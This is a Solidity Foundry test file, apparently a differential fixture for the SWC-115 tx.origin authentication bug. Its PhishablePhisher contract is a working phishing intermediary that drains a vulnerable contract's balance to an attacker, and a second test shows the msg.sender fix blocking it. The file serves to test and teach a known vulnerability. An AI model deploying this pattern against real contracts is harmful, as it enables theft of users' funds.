// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {Phishable} from "../src/Phishable.sol";
import {PhishableFixed} from "../src/PhishableFixed.sol";

// The phishing intermediary: the victim (the owner) is induced to call it, and
// it then calls the target on the victim's behalf, borrowing the victim's
// tx.origin. This is exactly the SWC-115 attack the vulnerable contract allows.
contract PhishablePhisher {
    function attack(address target, address recipient) external returns (bool ok) {
        (ok, ) = target.call(abi.encodeWithSignature("withdrawAll(address)", recipient));
    }
}

// Differential fixture for the SWC-115 tx.origin-authentication bug.
// `withdrawAll` authorises on `tx.origin == owner`, so a phishing contract can
// drain the balance. The fixed variant authorises on `msg.sender == owner`.
contract PhishableFixtureTest is Test {
    address internal victim;
    address internal attacker;

    function setUp() public {
        victim = makeAddr("victim");
        attacker = makeAddr("attacker");
    }

    function test_fixtureReproduces() public {
        Phishable p = new Phishable(victim);
        vm.deal(address(p), 1 ether);
        PhishablePhisher phisher = new PhishablePhisher();

        // The victim calls the phisher (tx.origin == victim); the phisher calls
        // withdrawAll (msg.sender == phisher). tx.origin still satisfies the check.
        vm.prank(victim, victim); // msg.sender == tx.origin == victim
        bool ok = phisher.attack(address(p), attacker);

        assertTrue(ok, "phishing call succeeded");
        assertEq(attacker.balance, 1 ether, "attacker drained the contract via tx.origin auth");
        assertEq(address(p).balance, 0, "contract emptied");
    }

    function test_fixtureDoesNotReproduce() public {
        PhishableFixed p = new PhishableFixed(victim);
        vm.deal(address(p), 1 ether);
        PhishablePhisher phisher = new PhishablePhisher();
        address ownerBefore = p.owner();

        vm.prank(victim, victim); // msg.sender == tx.origin == victim
        bool ok = phisher.attack(address(p), attacker);

        assertFalse(ok, "phishing call reverted: msg.sender != owner");
        assertEq(attacker.balance, 0, "attacker got nothing");
        assertEq(address(p).balance, 1 ether, "funds untouched");
        assertEq(p.owner(), ownerBefore, "owner unchanged");
    }
}
